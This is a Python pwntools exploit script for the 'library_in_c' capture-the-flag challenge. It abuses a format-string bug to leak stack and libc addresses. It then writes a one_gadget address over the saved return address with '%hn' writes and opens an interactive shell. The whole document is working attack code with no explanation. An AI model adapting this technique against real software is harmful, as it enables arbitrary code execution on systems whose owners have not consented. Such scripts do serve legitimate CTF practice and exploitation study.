#!/usr/bin/env python
from pwn import *

__DEBUG__ = 1
#context.log_level = 'debug'
p = None

def init():
        global p
        envs = {'LD_PRELOAD':'/home/nhiephon/libc.so.6'}
        if __DEBUG__:
                p = process('./library_in_c', env=envs)
        else:
                p = remote('shell.actf.co', 20201)
        return

def menu():
        return

def send_name(data=''):
        p.sendlineafter('name?', data)
        return

def check_out(data=''):
        p.sendafter('check out?', data)
        return

if __name__ == '__main__':
        init()
        send_name('%p %p %p')
        data = p.recvuntil('And')
                
        leak_stack = int(data[-48:-34], 16)
        rbp = leak_stack + 0x2730
        success('rbp : ' + hex(rbp))
                
        leak_libc = int(data[-16:-4], 16)
        success('leak_libc : ' + hex(leak_libc))
        libc_base = leak_libc - 0xf72c0
        success('libc_base : ' + hex(libc_base))
        one_gadget = 0x45216 + libc_base
        success('one_gadget : ' + hex(one_gadget))

        num1 = int(hex(one_gadget)[2:6], 16)
        num2 = int(hex(one_gadget)[6:10], 16)
        num3 = int(hex(one_gadget)[10:14], 16)

        if num1 < num2 and num2 < num3:
#               raw_input('?')
                payload = '%{}p%21$hn%{}p%22$hn%{}p%23$hn'.format(num1, num2-num1, num3-num2).ljust(40, 'A')  + p64(rbp+8 +4) + p64(rbp+8 +2) + p64(rbp+8)
                check_out(payload)
                p.interactive()